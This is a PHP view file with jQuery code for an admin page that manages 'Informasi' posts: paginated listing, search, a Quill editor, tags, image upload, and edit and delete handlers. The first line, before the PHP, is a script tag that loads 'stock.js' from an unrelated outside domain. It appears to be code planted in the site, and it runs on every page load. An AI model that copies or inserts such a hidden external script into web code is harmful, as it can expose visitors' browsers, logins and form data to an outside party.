<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->daftar;$data['focus']=$this->judul; $this->load->view($this->generalHeader,$data) ?>
<div id="result-content"></div>
<?php form($this->daftar,$baseView,$this->modalFullScreen);?>

<style>
    .ql-snow .ql-editor{
        min-height: 20.9em !important;
        max-height: 20.9em !important;
    }
</style>



<script>
    var urlLocal    = `${strInformasi}/${strDaftar}/`;
    var urlRead     = strRead,urlSave=strSave,urlDelete=strDelete,urlEdit=strEdit;
    var pages       = "<?=$data[$this->pages]?>";
    var judul       = attrId(strJudul);
    var modalForm   = attrId(`${strModal}${pages}`);
    var formInput   = attrId(strFormInput);
    var paramForm   = attrId(strParam);
    var resultContent=attrId(strResultContent);
    var anyPage     = attrId(`${strAny}${pages}`);
    var no=1;
    var quill;
    var tag;


    $(document).ready(function() {
        quill = setCkeditor(strDeskripsi);
        loadData(1);

    });

    modalForm.on(strShowModal, function () {
        getAllTag(urlLocal,function(res){tag = setTags(".tag",res); });
        var arrSelect = [strKategori,strJenis];
        arrSelect.forEach(function(row){setSelect(base_url+`${strInformasi}/${row}/${strGetAll}`,row);});
    });
    function nextLoad(par){
        var lastRow = toInt(attrId(strLastRows).val());
        var totalRow= toInt(attrId(strTotalRows).val());
        totalRow>lastRow&&loadData(toInt(no)+par);
    }
    function prevLoad(par){
        no > 1&&loadData(toInt(no)-par);
    }

    function loadData(page=1,isCache=true){
        no=page;
        var where=page;
        var any = anyPage.val()!==""?"?any="+anyPage.val():"";
        var totalRows = isNumber(attrId(strTotalRows).val());
        var url=base_url+urlLocal+urlRead;
        where+=any;
        if(!isCache) {
            if(totalRows === 0 ){localCache.remove(url+where);}
            else{for(var i=0;i<totalRows;i++){localCache.remove(url+`${i+1}${any}`);}}
        }
        ajaxView(urlLocal+urlRead+where,null,function(res){resultContent.html(res);});
    }
    function cari(e, val) {
        if (e.keyCode === 13) {
            anyPage.val(val);
            timeOut(function(){loadData(1,false);})
        }
    }
    formInput.validate({
        rules: {
            judul: {required: true},
            "tags": { required:true },
            "file_upload[]": { required:true }
        },
        errorPlacement: handleError(),
        submitHandler: function (form) {
            if(!validateQuill(quill.container.innerText,null,100)){
                timeOut(function(){quill.focus();});
                return;
            }
            var formData=new FormData(formInput[0]);
            var myEditor = document.querySelector(`#${strDeskripsi}`);
            var html = myEditor.children[0].innerHTML;
            formData.append(strDeskripsi, html);
            ajaxFile(base_url+urlLocal+urlSave,formData,function (res) {
                if (res.status) {
                    validateSaveHmtl(judul.val(),anyPage.val(),paramForm.val(),function(page,searchName){
                        if(!searchName && paramForm.val()===strEdit) anyPage.val("");
                        loadData(page,false);
                        notif(strSuccess);
                        delForm(formInput);
                        modalForm.modal(strHide);
                        paramForm.val(strAdd);
                    });

                } else {
                    notif(strFailed);
                }
            })

        }
    });

    function hapus(id) {
        validateDeleteHtml(base_url+urlLocal+urlDelete,id,anyPage.val(),function(page,isCache){
            if(page===1) {
                anyPage.val("");
                attrId(strActiveRows).val(`${page}`)
            }
            loadData(page,isCache);
        })
    }
    function ubah(id) {
        var baseUrl=base_url+urlLocal+urlEdit+"/"+id;
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                var data=res.res_data;
                setFocus(strJudul);
                var dataSet = [
                    {[strNama]:strId,attr:strId},{[strNama]:strJudul,attr:strId},
                    {[strNama]:strKategori,attr:strId},{[strNama]:strJenis,attr:strId},{[strNama]:strStatus,attr:strId},
                ];
                setFileImage(data[strGambar],strInformasi);
                setTagify(tag,data[strTag]);
                setQuill(quill,data[strDeskripsi]);
                dataSet.forEach(function(row){
                    var attr= row["attr"];
                    var val = row[strNama];
                    if(attr===strId) setIdSelect(val,data[val])
                })
            } else {
                notif(strFailed);
            }
        });
    }
    modalForm.on(strHideModal, function () {
        delForm(formInput);
        delValueSelect(strPlatform);
        timeOut(function(){
            delQuill(quill);
            delImage();
            delTagify(tag);
        })
    });
    modalForm.on(strShowModal, function () {
        timeOut(function(){
            var title=attrClass(strModalTitle).text();
            title+=' Informasi';
            attrClass(strModalTitle).text(title)
        })
    });

</script>